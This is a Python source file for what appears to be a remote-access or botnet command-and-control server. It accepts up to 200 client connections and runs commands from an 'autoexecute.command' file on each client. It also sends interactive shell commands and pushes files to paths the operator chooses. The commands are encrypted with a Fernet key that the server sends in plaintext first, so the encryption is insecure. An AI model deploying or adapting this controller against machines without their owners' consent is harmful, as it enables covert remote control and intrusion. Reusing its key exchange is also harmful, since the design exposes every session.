import socket, threading, os
from cryptography.fernet import Fernet


port = 5567
max_clients = 200

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(("0.0.0.0", port))

s.listen(max_clients)

print("LISTENING ON 0.0.0.0:" + str(port))

key = b""
if os.path.exists("client.key"):
    print("Found key, reading bytes")
    with open("client.key", "rb") as f:
        key = f.read()
else:
    print("No key found, generating...")
    key = Fernet.generate_key()
    with open("client.key", "wb") as f:
        f.write(key)

#make a thread for the client
def handle_client(conn, addr):
    print("Connected to: " + str(addr[0]))
    conn.send(b"{SERVER KEY}")
    conn.send(key)
    #check for auto execute command
    if os.path.exists("autoexecute.command"):
        #send the commands
        with open("autoexecute.command", "r") as f:
            for line in f.readlines():
                conn.send(b"{COMMAND}")
                conn.send(Fernet(key).encrypt(line.encode()))
                data = b""
                while True:
                    data = conn.recv(1024)
                    if data: break
                output = Fernet(key).decrypt(data)
                print(output.decode())
    #handle client requests
    while True:
        cmd = input(">>>").encode()
        if cmd.decode() == "abort":
            conn.send(b"{ABORT}")
            conn.close()
            print("SAFE")
            break
        elif cmd == b"send_file":
            file_path = input("File path: ")
            client_path = input("Path for client (full): ")
            file_size = os.path.getsize(file_path)
            seperator = "<SEPERATOR>"
            conn.send(b"{FILE}")
            head = file_path + seperator + str(file_size) + seperator + client_path
            conn.send(head.encode())
            with open(file_path, "rb") as f:
                while True:
                    bytes_read = f.read(1024 if file_size > 1024 else file_size)
                    if not bytes_read: break
                    conn.sendall(bytes_read)
                print("SENT")
                conn.send(b"{END OF FILE}")
                continue
        elif cmd == b"help":
            print("""Help
            send_file: will run you through a server to client file transfer wizard
            abort: safty kill switch, instantly kill the current client
            help: display this message""")
            continue
        conn.send(b"{COMMAND}")
        conn.send(Fernet(key).encrypt(cmd))
        data = b""
        while True:
            data = conn.recv(1024)
            if data: break
        output = Fernet(key).decrypt(data)
        print(output.decode())

while True:
    conn, addr = s.accept()
    threading.Thread(target=handle_client, args=(conn,addr,)).start()